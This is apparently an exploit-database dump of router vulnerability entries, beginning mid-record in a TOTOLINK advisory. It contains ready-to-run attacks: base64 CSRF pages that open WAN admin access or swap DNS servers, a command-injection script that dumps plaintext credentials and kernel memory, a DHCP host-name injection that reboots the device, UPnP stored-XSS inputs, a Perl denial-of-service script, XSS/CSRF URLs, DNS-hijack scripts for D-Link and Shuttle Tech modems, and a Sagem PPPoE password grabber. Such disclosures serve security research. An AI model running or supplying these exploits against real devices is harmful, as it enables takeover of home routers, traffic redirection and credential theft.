<input type=""hidden"" name=""SET9"" value=""117703168="">
<input type=""hidden"" name=""SET10"" value=""117637376=1492"">
<input type=""hidden"" name=""SET11"" value=""51446016=1500"">
<input type=""hidden"" name=""SET12"" value=""50463488=192.168.1.1"">
<input type=""hidden"" name=""SET13"" value=""50529024=255.255.255.0"">
<input type=""hidden"" name=""SET14"" value=""50594560=192.168.1.254"">
</form>
</body>
</html>
The variable GO is an open redirect. Any URL like
The variable GO is also vulnerable to XSS. It's out of scope in this advisory.
To bypass the protection (which checks the refer), you can, for
example, base64 the form and include
it in the webpage.
The refer will be empty and the CSRF will be accepted by the device:
o activate_admin_wan_csrf_bypass.html:
<html>
<head>
<meta http-equiv=""Refresh""
content=""1;url=data:text/html;charset=utf8;base64,PGh0bWw+CjxoZWFkPgo8c2NyaXB0PgpmdW5jdGlvbiBzKCkgewogIGRvY3VtZW50LmYuc3VibWl0KCk7Cn0KPC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHkgb25sb2FkPSJzKCkiPgo8Zm9ybSBpZD0iZiIgbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249Imh0dHA6Ly8xOTIuMTY4LjEuMS9kb19jbWQuaHRtIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iQ01EIiB2YWx1ZT0iU1lTIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iR08iIHZhbHVlPSJmaXJld2FsbGNvbmZfYWNjZXNzbGlzdC5odG1sIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ibm93YWl0IiB2YWx1ZT0iMSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDAiIHZhbHVlPSIxNzM2NzI5Nj0zMTMzNyI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDEiIHZhbHVlPSIxNzIzNjIyND0xIj4KPC9mb3JtPgo8L2JvZHk+CjwvaHRtbD4K"">
</head>
<body>
</body>
</html>
Visiting activate_admin_wan_csrf_bypass.html in a remote location will activate
the remote management interface on port 31337/TCP.
You can test it through
o change_dns_csrf_bypass.html:
<html>
<head>
<meta http-equiv=""Refresh""
content=""1;url=data:text/html;charset=utf8;base64,PGh0bWw+CjxoZWFkPgo8c2NyaXB0PgpmdW5jdGlvbiBzKCkgewogIGRvY3VtZW50LmYuc3VibWl0KCk7Cn0KPC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHkgb25sb2FkPSJzKCkiPgo8Zm9ybSBpZD0iZiIgbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249Imh0dHA6Ly8xOTIuMTY4LjEuMS9kb19jbWQuaHRtIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iQ01EIiB2YWx1ZT0iV0FOIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iR08iIHZhbHVlPSJuZXRjb25mX3dhbnNldHVwLmh0bWwiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJTRVQwIiB2YWx1ZT0iNTAzOTc0NDA9MiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDEiIHZhbHVlPSI1MDg1Njk2MD02NC1FNS05OS1BQS1BQS1BQSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDIiIHZhbHVlPSIyMzUwNzc4ODg9MSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDMiIHZhbHVlPSIyMzUwMTI4NjU9MC4yLjAuNyI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDQiIHZhbHVlPSIyMzUwMTI4NjY9MS4yLjAuMSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDUiIHZhbHVlPSI1MTExODMzNj0wIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUNiIgdmFsdWU9IjUxODM5MjMyPTEiPgo8aW5wdXQgdHlwZT0iaGlkZGVu
IiBuYW1lPSJTRVQ3IiB2YWx1ZT0iNTE1MTE1NTI9MTUwMCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDgiIHZhbHVlPSIxMTc4MzQyNDA9Ij4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUOSIgdmFsdWU9IjExNzcwMzE2OD0iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJTRVQxMCIgdmFsdWU9IjExNzYzNzM3Nj0xNDkyIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUMTEiIHZhbHVlPSI1MTQ0NjAxNj0xNTAwIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUMTIiIHZhbHVlPSI1MDQ2MzQ4OD0xOTIuMTY4LjEuMSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDEzIiB2YWx1ZT0iNTA1MjkwMjQ9MjU1LjI1NS4yNTUuMCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDE0IiB2YWx1ZT0iNTA1OTQ1NjA9MTkyLjE2OC4xLjI1NCI+CjwvZm9ybT4KPC9ib2R5Pgo8L2h0bWw+Cg=="">
</head>
<body>
</body>
</html>
Visiting activate_admin_wan_csrf_bypass.html in a remote location will
change the DNS servers
provided by the TOTOLINK device in the LAN.
You can test it through
There is a stored XSS, which can be injected using UPNP from the LAN,
without authentication:
upnp> host send 0 WANConnectionDevice WANIPConnection AddPortMapping
Required argument:
Argument Name:  NewPortMappingDescription
Data Type:      string
Allowed Values: []
Set NewPortMappingDescription value to: <script>alert(""XSS"");</script>
Required argument:
Argument Name:  NewLeaseDuration
Data Type:      ui4
Allowed Values: []
Set NewLeaseDuration value to: 0
Required argument:
Argument Name:  NewInternalClient
Data Type:      string
Allowed Values: []
Set NewInternalClient value to: <script>alert(""XSS"");</script>
Required argument:
Argument Name:  NewEnabled
Data Type:      boolean
Allowed Values: []
Set NewEnabled value to: 1
Required argument:
Argument Name:  NewExternalPort
Data Type:      ui2
Allowed Values: []
Set NewExternalPort value to: 80
Required argument:
Argument Name:  NewRemoteHost
Data Type:      string
Allowed Values: []
Set NewRemoteHost value to: <script>alert(""XSS"");</script>
Required argument:
Argument Name:  NewProtocol
Data Type:      string
Allowed Values: ['TCP', 'UDP']
Set NewProtocol value to: TCP
Required argument:
Argument Name:  NewInternalPort
Data Type:      ui2
Allowed Values: []
Set NewInternalPort value to: 80
upnp>
The UPNP webpage in the administration area
(http://192.168.0.1/popup_upnp_portmap.html) will show:
<tr>
<td class=item_td>TCP</td>
<td class=item_td>21331</td>
<td class=item_td><script>alert(""XSS"")<script>alert(""XSS"");</script>:28777</td>
<td class=item_td><script>alert(""XSS"");</script></td>
</tr>
- From my research, there are some bits overflapping with others,
resulting in showing funny ports
and truncating input data. A remote DoS against the upnpd process
seems to be easily done.
Gaining Remote Code Execution by UPNP exploitation is again left as a
exercise for the reader.
Due to ""un-ethical code"" found in TOTOLINK products (= backdoors found
in new TOTOLINK devices), TOTOLINK was not contacted in regard of this
case.
* Apr 20, 2015: Vulnerabilities found by Pierre Kim in ipTIME devices.
* Jun 20, 2015: Vulnerabilities confirmed with reliable PoCs.
* Jun 25, 2015: Vulnerabilities found in TOTOLINK products by looking
for similar ipTIME products.
* Jul 16, 2015: A public advisory is sent to security mailing lists.
These vulnerabilities were found by Pierre Kim (@PierreKimSec).
Big thanks to Alexandre Torres.
This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/"
2015-07-16,WebApps,Hardware,Pierre Kim,15 TOTOLINK Router Models,Multiple Remote Code Execution Vulnerabilities,"## Advisory Information
## Product Description
## Vulnerabilities Summary
## Details - RCE with a single HTTP request
#!/bin/sh
http://pierrekim.github.io/advisories/
http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-listing.of.the.filesystem.html
http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-dump.configuration.including.credentials.html
http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-current.process.html
http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-getting.kernel.memory.html
http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-default.firewall.rules.html
http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-opening.the.firewall.html
http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-reboot.html
http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-bricking.the.device.html
## Details - RCE with a single DHCP request
## Vendor Response
## Report Timeline
## Credit
## References
https://pierrekim.github.io/advisories/2015-totolink-0x00.txt
https://pierrekim.github.io/blog/2015-07-16-15-TOTOLINK-products-vulnerable-to-multiple-RCEs.html
## Disclaimer","Title: 15 TOTOLINK router models vulnerable to multiple RCEs
Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x00.txt
Blog URL: https://pierrekim.github.io/blog/2015-07-16-15-TOTOLINK-products-vulnerable-to-multiple-RCEs.html
Date published: 2015-07-16
Vendors contacted: None
Release mode: 0days, Released
CVE: no current CVE
TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO
markets in South Korea.
TOTOLINK produces routers routers, wifi access points and network
devices. Their products are sold worldwide.
The first vulnerability allows to bypass the admin authentication and
to get a direct RCE from the LAN side with a single HTTP request.
The second vulnerability allows to bypass the admin authentication and
to get a direct RCE from the LAN side with a single DHCP request.
There are direct RCEs against the routers which give a complete root
access to the embedded Linux from the LAN side.
The two RCEs affect 13 TOTOLINK products from 2009-era firmwares to
the latest firmwares with the default configuration:
- TOTOLINK A1004 : until last firmware (9.34 - za1004_en_9_34.bin)
- TOTOLINK A5004NS : until last firmware (9.38 - za5004s_en_9_38.bin)
- TOTOLINK EX300 : until last firmware (8.68 - TOTOLINK EX300_8_68.bin
- totolink.net)
- TOTOLINK EX300 : until last firmware (9.36 -
ex300_ch_9_36.bin.5357c0 - totolink.cn)
- TOTOLINK N150RB : until last firmware (9.08 - zn150rb_en_9_08.bin.5357c0)
- TOTOLINK N300RB : until last firmware (9.26 - zn300rb_en_9_26.bin)
- TOTOLINK N300RG : until last firmware (8.70 - TOTOLINK N300RG_8_70.bin)
- TOTOLINK N500RDG : until last firmware (8.42 - TOTOLINK N500RDG_en_8_42.bin)
- TOTOLINK N600RD : until last firmware (8.64 - TOTOLINK N600RD_en_8_64.bin)
- TOTOLINK N302R Plus V1 : until the last firmware 8.82 (TOTOLINK
N302R Plus V1_en_8_82.bin)
- TOTOLINK N302R Plus V2 : until the last firmware 9.08 (TOTOLINK
N302R Plus V2_en_9_08.bin)
- TOTOLINK A3004NS (no firmware available in totolinkusa.com but
ipTIME's A3004NS model was vulnerable to the 2 RCEs)
- TOTOLINK EX150 : until the last firmware (8.82 - ex150_ch_8_82.bin.5357c0)
The DHCP RCE also affects 2 TOTOLINK products from 2009-era firmwares
to the latest firmwares with the default configuration:
- TOTOLINK A2004NS : until last firmware (9.60 - za2004s_en_9_60.bin)
- TOTOLINK EX750 : until last firmware (9.60 - ex750_en_9_60.bin)
Firmwares come from totolink.net and from totolink.cn.
- - From my tests, it is possible to use these vulnerabilities to
overwrite the firmware with a custom (backdoored) firmware.
Concerning the high CVSS score (10/10) of the vulnerabilities and the
longevity of this vulnerability (6+ year old),
the TOTOLINK users are urged to contact TOTOLINK.
The HTTP server allows the attacker to execute some CGI files.
Many of them are vulnerable to a command inclusion which allows to
execute commands with the http daemon user rights (root).
Exploit code:
$ cat totolink.carnage
if [ ! $1 ]; then
echo ""Usage:""
echo $0 ip command
exit 1
fi
wget -qO- --post-data=""echo 'Content-type:
text/plain';echo;echo;PATH=$PATH:/sbin $2 $3 $4"" http://$1/cgi-bin/sh
The exploits have been written in HTML/JavaScript, in form of CSRF
attacks, allowing people to test their systems in live using their
browsers:
o Listing of the filesystem
HTML/JS exploits:
Using CLI:
root@kali:~/totolink# ./totolink.carnage 192.168.1.1 ls | head
ash
auth
busybox
cat
chmod
cp
d.cgi
date
echo
false
root@kali:~/totolink#
o How to retrieve the credentials ? (see login and password at the end
of the text file)
HTML/JS exploits:
Using CLI:
kali# ./totolink.carnage 192.168.1.1 cat /tmp/etc/iconfig.cfg
wantype.wan1=dynamic
dhblock.eth1=0
ppp_mtu=1454
fakedns=0
upnp=1
ppp_mtu=1454
timeserver=time.windows.com,gmt22,1,480,0
wan_ifname=eth1
auto_dns=1
dhcp_auto_detect=0
wireless_ifmode+wlan0=wlan0,0
dhcpd=0
lan_ip=192.168.1.1
lan_netmask=255.255.255.0
dhcpd_conf=br0,192.168.1.2,192.168.1.253,192.168.1.1,255.255.255.0
dhcpd_dns=164.124.101.2,168.126.63.2
dhcpd_opt=7200,30,200,
dhcpd_configfile=/etc/udhcpd.conf
dhcpd_lease_file=/etc/udhcpd.leases
dhcpd_static_lease_file=/etc/udhcpd.static
use_local_gateway=1
login=admin
password=admin
Login and password are stored in plaintext, which is a very bad
security practice.
o Current running process:
HTML/JS exploits:
Using CLI:
kali# ./totolink.carnage 192.168.1.1 ps -auxww
o Getting the kernel memory:
HTML/JS exploits:
Using CLI:
kali# ./totolink.carnage 192.168.1.1 cat /proc/kcore
o Default firewall rules:
HTML/JS exploits:
Using CLI:
kali# ./iptime.carnage.l2.v9.52 192.168.1.1 iptables -nL
o Opening the management interface on the WAN:
HTML/JS exploits:
o Reboot the device:
HTML/JS exploits:
o Brick the device:
HTML/JS exploits:
An attacker can use the /usr/bin/wget binary located in the file
system of the remote device to plant a backdoor and then execute it as
root.
By the way, d.cgi in /bin/ is an intentional backdoor.
This vulnerability is the exact inverse of CVE-2011-0997. The DHCPD
server in TOTOLINK devices allows remote attackers to execute
arbitrary commands
via shell metacharacters in the host-name field.
Sending a DHCP request with this parameter will reboot the device:
cat /etc/dhcp/dhclient.conf
send host-name "";/sbin/reboot"";
When connecting to the UART port (`screen /dev/ttyUSB0 38400`), we
will see the stdout of the /dev/console device;
the dhcp request will immediately force the reboot of the remote device:
Booting...
@ chip__no chip__id mfr___id dev___id cap___id size_sft dev_size chipSize
@ 0000000h 0c84015h 00000c8h 0000040h 0000015h 0000000h 0000015h 0200000h
@ blk_size blk__cnt sec_size sec__cnt pageSize page_cnt chip_clk chipName
@ 0010000h 0000020h 0001000h 0000200h 0000100h 0000010h 000004eh GD25Q16
WiFi Simple Config v1.12 (2009.07.31-11:35+0000).
Launch iwcontrol: wlan0
Reaped 317
iwcontrol RUN OK
SIGNAL -> Config Update signal progress
killall: pppoe-relay: no process killed
SIGNAL -> WAN ip changed
WAN0 IP: 192.168.2.1
signalling START
Invalid upnpd exit
killall: upnpd: no process killed
upnpd Restart 1
iptables: Bad rule (does a matching rule exist in that chain?)
Session Garbage Collecting:Maybe system time is updated.( 946684825 0 )
Update Session timestamp and try it after 5 seconds again.
ez_ipupdate callback --> time_elapsed: 0
Run DDNS by IP change:  / 192.168.2.1
Reaped 352
iptables: Bad rule (does a matching rule exist in that chain?)
Jan  1 00:00:25 miniupnpd[370]: Reloading rules from lease file
Jan  1 00:00:25 miniupnpd[370]: could not open lease file: /var/run/upnp_pmlist
Jan  1 00:00:25 miniupnpd[370]: HTTP listening on port 2048
Reaped 363
Led Silent Callback
Turn ON All LED
Dynamic Channel Search for wlan0 is OFF
start_signal => plantynet_sync
Do start_signal => plantynet_sync
SIGNAL -> Config Update signal progress
killall: pppoe-relay: no process killed
SIGNAL -> WAN ip changed
Reaped 354
iptables: Bad rule (does a matching rule exist in that chain?)
ez_ipupdate callback --> time_elapsed: 1
Run DDNS by IP change:  / 192.168.2.1
Burst DDNS Registration is denied: iptime -> now:26
Led Silent Callback
Turn ON All LED
/proc/sys/net/ipv4/tcp_syn_retries: cannot create
- - - ---> Plantynet Event : 00000003
- - - ---> PLANTYNET_SYNC_INTERNET_BLOCK_DEVICE
[sending the DHCP request]
[01/Jan/2000:00:01:03 +0000] [01/Jan/2000:00:01:03 +0000] Jan  1
00:01:03 miniupnpd[370]: received signal 15, good-bye
Reaped 392
Reaped 318
Reaped 314
Reaped 290
Reaped 288
Reaped 268
Reaped 370
Reaped 367
- - - ---> PLANTYNET_SYNC_FREE_DEVICE
Restarting system.
Booting...
@ chip__no chip__id mfr___id dev___id cap___id size_sft dev_size chipSize
@ 0000000h 0c84015h 00000c8h 0000040h 0000015h 0000000h 0000015h 0200000h
@ blk_size blk__cnt sec_size sec__cnt pageSize page_cnt chip_clk chipName
@ 0010000h 0000020h 0001000h 0000200h 0000100h 0000010h 000004eh GD25Q16
Reboot Result from Watchdog Timeout!
- - - ---RealTek(RTL8196E)at 2012.07.06-04:36+0900 v0.4 [16bit](400MHz)
Delay 1 second till reset button
Magic Number: raw_nv 00000000
Check Firmware(05020000) : size: 0x001ddfc8 ---->
An attacker can use the /usr/bin/wget binary located in the file
system of the remote device to plant a backdoor and then execute it as
root.
Due to ""un-ethical code"" found in TOTOLINK products (= backdoors found
in new TOTOLINK devices), TOTOLINK was not contacted in regard of this
case, but ipTIME was contacted in April 2015 concerning the first RCE.
* Jun 01, 2014: First RCE found by Pierre Kim and Alexandre Torres in
ipTIME products.
* Jun 02, 2014: Second RCE found by Pierre Kim in ipTIME products.
* Jun 25, 2015: Similar vulnerabilities found in TOTOLINK products.
* Jul 13, 2015: TOTOLINK silently fixed the HTTP RCE in A2004NS and
EX750 routers.
* Jul 13, 2015: Updated firmwares confirmed vulnerable.
* Jul 16, 2015: A public advisory is sent to security mailing lists.
These vulnerabilities were found by Alexandre Torres and Pierre Kim
(@PierreKimSec).
This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/"
2012-05-08,Remote,Hardware,Kalashinkov3,Linksys WRT54GL Wireless Router,Cross-Site Request Forgery,source: https://www.securityfocus.com/bid/53427/info,"The Linksys WRT54GL router is prone to a cross-site request-forgery vulnerability.
Successful exploits may allow attackers to run privileged commands on the affected device, change configuration, cause denial-of-service conditions, or inject arbitrary script code. Other attacks are also possible.
submit_button=Management&change_action=&action=Apply&PasswdModify=1&remote_mgt_https=0&http_enable=1&https_enable=0&wait_time=4&need_reboot=0&http_passwd=YOUR PASSWORD&http_passwdConfirm=YOUR PASSWORD&_http_enable=1&web_wl_filter=0&remote_management=0&upnp_enable=1"
2012-02-21,DoS,Hardware,demonalex,Mercury MR804 Router,Multiple HTTP Header Fields Denial of Service Vulnerabilities,"source: https://www.securityfocus.com/bid/52106/info
#!/usr/bin/perl -w
#recv(SOCK, $test_payload, 100, 0);","Mercury MR804 router is prone to multiple denial-of-service vulnerabilities.
Remote attackers can exploit these issues to cause the device to crash, denying service to legitimate users.
Mercury MR804 running version 3.8.1 Build 101220 is vulnerable.
use Socket;
$|=1;
print '*********************************'.""\n"";
print '* mercurycom MR804 v8.0 DoS PoC *'.""\n"";
print '*  writed by demonalex@163.com  *'.""\n"";
print '*********************************'.""\n"";
$evil='A'x4097;
$test_ip=shift;                           #target ip
$test_port=shift;                         #target port
if(!defined($test_ip) || !defined($test_port)){
die ""usage : $0 target_ip target_port\n"";
$test_payload=
""GET / HTTP/1.0\r\n"".
""Accept: */*\r\n"".
""Accept-Language: zh-cn\r\n"".
""UA-CPU: x86\r\n"".
""If-Unmodified-Since: "".$evil.""\r\n"".
""Accept-Encoding: gzip, deflate\r\n"".
""User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322;"".
"" .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; 360SE)\r\n"".
""Host: "".$test_ip.""\r\n"".
""Connection: Keep-Alive"".""\r\n\r\n"";
$test_target=inet_aton($test_ip);
$test_target=sockaddr_in($test_port, $test_target);
socket(SOCK, AF_INET, SOCK_STREAM, 6) || die ""cannot create socket!\n"";
connect(SOCK, $test_target) || die ""cannot connect the target!\n"";
send(SOCK, $test_payload, 0) || die ""cannot send the payload!\n"";
close(SOCK);
print ""done!\n"";
exit(1);"
2012-02-21,Remote,Hardware,Busindre,Xavi 7968 ADSL Router,'/webconfig/wan/confirm.html/confirm?pvcName' Cross-Site Scripting,"source: https://www.securityfocus.com/bid/52098/info
http://www.example.com/webconfig/wan/confirm.html/confirm?context=pageAction%3Dadd%26pvcName%3D%2522%253e%253c%252ftd%253e%253cscript%253ealert%28document.cookie%29%253c%252fscript%253e%26vpi%3D0%26vci%3D38%26scat%3DUBR%26accessmode%3Dpppoe%26encap%3Dvcmux%26encapmode%3Dbridged%26iptype%3Ddhcp%26nat_enable%3Dfalse%26def_route_enable%3Dfalse%26qos_enable%3Dfalse%26chkPPPOEAC%3Dfalse%26tBoxPPPOEAC%3DNot%2520Configured%26sessiontype%3Dalways_on%26username%3Da%26password%3Dss&confirm=+Apply+","Xavi 7968 ADSL Router is prone to cross-site scripting, HTML-injection and cross-site request forgery vulnerabilities.
The attacker can exploit the issues to execute arbitrary script code in the context of the vulnerable site, potentially allowing the attacker to steal cookie-based authentication credentials, or perform certain administrative functions on victim's behalf. Other attacks are also possible."
2012-02-21,WebApps,Hardware,Busindre,Xavi 7968 ADSL Router,'/webconfig/lan/lan_config.html/local_lan_config?host_name_txtbox' Cross-Site Scripting,"source: https://www.securityfocus.com/bid/52098/info
http://www.example.com/webconfig/lan/lan_config.html/local_lan_config?ip_add_txtbox=www.example2.com&sub_mask_txtbox=255.255.255.0&host_name_txtbox=Hack<SCRIPT>alert(document.cookie)</script>&domain_name_txtbox=local.lan&mtu_txtbox=1500&next=Apply","Xavi 7968 ADSL Router is prone to cross-site scripting, HTML-injection and cross-site request forgery vulnerabilities.
The attacker can exploit the issues to execute arbitrary script code in the context of the vulnerable site, potentially allowing the attacker to steal cookie-based authentication credentials, or perform certain administrative functions on victim's behalf. Other attacks are also possible."
2012-02-21,Remote,Hardware,Busindre,Xavi 7968 ADSL Router,Multiple Cross-Site Request Forgery Vulnerabilities,"source: https://www.securityfocus.com/bid/52098/info
http://www.example.com/webconfig/wan/confirm.html/confirm?context=pageAction%3Dadd%26pvcName%3D%2522%253e%253c%252ftd%253e%253cscript%253ealert%28document.cookie%29%253c%252fscript%253e%26vpi%3D0%26vci%3D38%26scat%3DUBR%26accessmode%3Dpppoe%26encap%3Dvcmux%26encapmode%3Dbridged%26iptype%3Ddhcp%26nat_enable%3Dfalse%26def_route_enable%3Dfalse%26qos_enable%3Dfalse%26chkPPPOEAC%3Dfalse%26tBoxPPPOEAC%3DNot%2520Configured%26sessiontype%3Dalways_on%26username%3Da%26password%3Dss&confirm=+Apply+","Xavi 7968 ADSL Router is prone to cross-site scripting, HTML-injection and cross-site request forgery vulnerabilities.
The attacker can exploit the issues to execute arbitrary script code in the context of the vulnerable site, potentially allowing the attacker to steal cookie-based authentication credentials, or perform certain administrative functions on victim's behalf. Other attacks are also possible."
2015-02-18,WebApps,Hardware,Todor Donev,D-Link DSL-2640B ADSL Router,'ddnsmngr' Remote DNS Change,"#!/bin/bash
#  D-Link DSL-2640B Unauthenticated Remote DNS Change Exploit
#  Copyright 2015 (c) Todor Donev <todor.donev at gmail.com>
#  http://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  Description:
#  Different D-Link Routers are vulnerable to DNS change.
#  The vulnerability exist in the web interface, which is
#  accessible without authentication.
#  Tested firmware version: EU_2.03
#  ACCORDING TO THE VULNERABILITY DISCOVERER, MORE D-Link
#  DEVICES OR FIRMWARE VERSIONS MAY AFFECTED.
#  Once modified, systems use foreign DNS servers,  which are
#  usually set up by cybercriminals. Users with vulnerable
#  systems or devices who try to access certain sites are
#  instead redirected to possibly malicious sites.
#  Modifying systems' DNS settings allows cybercriminals to
#  perform malicious activities like:
#    o  Steering unknowing users to bad sites:
#       These sites can be phishing pages that
#       spoof well-known sites in order to
#       trick users into handing out sensitive
#       information.
#    o  Replacing ads on legitimate sites:
#       Visiting certain sites can serve users
#       with infected systems a different set
#       of ads from those whose systems are
#       not infected.
#    o  Controlling and redirecting network traffic:
#       Users of infected systems may not be granted
#       access to download important OS and software
#       updates from vendors like Microsoft and from
#       their respective security vendors.
#    o  Pushing additional malware:
#       Infected systems are more prone to other
#       malware infections (e.g., FAKEAV infection).
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!","if [[ $# -gt 3 || $# -lt 2 ]]; then
echo ""     D-Link DSL-2640B Unauthenticated Remote DNS Change Exploit""
echo ""  ================================================================""
echo ""  Usage: $0 <Target> <Preferred DNS> <Alternate DNS>""
echo ""  Example: $0 192.168.1.1 8.8.8.8""
echo ""  Example: $0 192.168.1.1 8.8.8.8 8.8.4.4""
echo """"
echo ""     Copyright 2015 (c) Todor Donev <todor.donev at gmail.com>""
echo ""                  http://www.ethical-hacker.org/""
echo ""             https://www.facebook.com/ethicalhackerorg""
exit;
fi
GET=`which GET 2>/dev/null`
if [ $? -ne 0 ]; then
echo ""  Error : libwww-perl not found =/""
exit;
fi
GET ""http://$1/ddnsmngr.cmd?action=apply&service=0&enbl=0&dnsPrimary=$2&dnsSecondary=$3&dnsDynamic=0&dnsRefresh=1&dns6Type=DHCP"" 0&> /dev/null <&1"
2011-07-27,Remote,Hardware,securititracker,Sagem F@st 3304 Routers,PPPoE Credentials Information Disclosure,"source: https://www.securityfocus.com/bid/48908/info
#!/bin/bash
# Exploit Title: Sagem 3304 Routers Get PPPOE Password
# Date 27/07/2011
# Author: securititracker@gmail.com
# Software Link: null
# Version: Sagem Routers F@st 3304
# Tested on: Sagem F@ST 3304","Sagem F@st 3304 router is prone to a remote information-disclosure vulnerability because it fails to restrict access to sensitive information.
A remote attacker exploit this issue to obtain sensitive information, possibly aiding in further attacks.
Usage()
echo ""Usage : $0 IP_ADDRESS""
if [ ""$1"" != """" ]
then
IP_ADDRESS=""$1""
else
Usage
exit 1
fi
USER_NAME=`wget http://$IP_ADDRESS/quickconfname_ADSL.html  -t 1 -q -O -  | grep ""msg051"" | tr "" "" ""\n""  | grep value | tr -d \\ |tr -d ""\"""" | awk -F= '{print($2)}' `
USER_PASSWORD=`wget http://$IP_ADDRESS/quickconfname_ADSL.html  -t 1 -q -O -  | grep ""msg051"" | tr "" "" ""\n""  | grep value | tr -d \\ |tr -d ""\"""" | awk -F= '{print($2)}' `
echo ""Username = $USER_NAME  ; Passsword = $USER_PASSWORD"""
2015-02-05,Remote,Hardware,Todor Donev,Shuttle Tech ADSL Modem/Router 915 WM,Remote DNS Change,"#!/bin/bash
#        Shuttle Tech ADSL Modem-Router 915 WM
#      Unauthenticated Remote DNS Change Exploit
#  Copyright 2015 (c) Todor Donev <todor.donev at gmail.com>
#  http://www.ethical-hacker.org/
#  Description:
#  The vulnerability exist in the web interface, which is
#  accessible without authentication.
#  Once modified, systems use foreign DNS servers,  which are
#  usually set up by cybercriminals. Users with vulnerable
#  systems or devices who try to access certain sites are
#  instead redirected to possibly malicious sites.
#  Modifying systems' DNS settings allows cybercriminals to
#  perform malicious activities like:
#    o  Steering unknowing users to bad sites:
#       These sites can be phishing pages that
#       spoof well-known sites in order to
#       trick users into handing out sensitive
#       information.
#    o  Replacing ads on legitimate sites:
#       Visiting certain sites can serve users
#       with infected systems a different set
#       of ads from those whose systems are
#       not infected.
#    o  Controlling and redirecting network traffic:
#       Users of infected systems may not be granted
#       access to download important OS and software
#       updates from vendors like Microsoft and from
#       their respective security vendors.
#    o  Pushing additional malware:
#       Infected systems are more prone to other
#       malware infections (e.g., FAKEAV infection).
#  Warning:
#  My first public report on such a serious
#  vulnerability was ignored by the manufacturers
#  and were committed serious criminal deeds of
#  cybercriminals in Brasil. This vulnerability
#  could affect millions of users worldwide.
#  http://www.exploit-db.com/exploits/16275/
#  http://securelist.com/blog/research/57776/the-tale-of-one-thousand-and-one-dsl-modems/
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!","if [[ $# -gt 3 || $# -lt 2 ]]; then
echo ""             Shuttle Tech ADSL Modem-Router 915 WM""
echo ""           Unauthenticated Remote DNS Change Exploit""
echo ""  ================================================================""
echo ""  Usage: $0 <Target> <Primary DNS> <Secondary DNS>""
echo ""  Example: $0 133.7.133.7 8.8.8.8""
echo ""  Example: $0 133.7.133.7 8.8.8.8 8.8.4.4""
echo """"
echo ""     Copyright 2015 (c) Todor Donev <todor.donev at gmail.com>""
echo ""                  http://www.ethical-hacker.org/""
exit;
fi
GET=`which GET 2>/dev/null`
if [ $? -ne 0 ]; then
echo ""  Error : libwww-perl not found =/""
exit;
fi
GET ""http://$1/dnscfg.cgi?dnsPrimary=$2&dnsSecondary=$3&dnsDynamic=0&dnsRefresh=1"" 0&> /dev/null <&1"
